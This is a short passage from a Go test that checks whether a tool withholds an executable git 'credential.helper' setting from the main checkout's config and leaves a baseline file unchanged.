		withheldLine("credential.helper", "exec value", helper, "main checkout", r.common+"/config")+
			ownTerminalLine("credential.helper", "credential.helper")+
			withheldNote+
			prompt(r.baseline()),
		"crew: baseline unchanged\n")
	if after := readFile(t, r.baseline()); after != before {
		t.Fatalf("baseline changed: %q, want %q", after, before)
	}
}
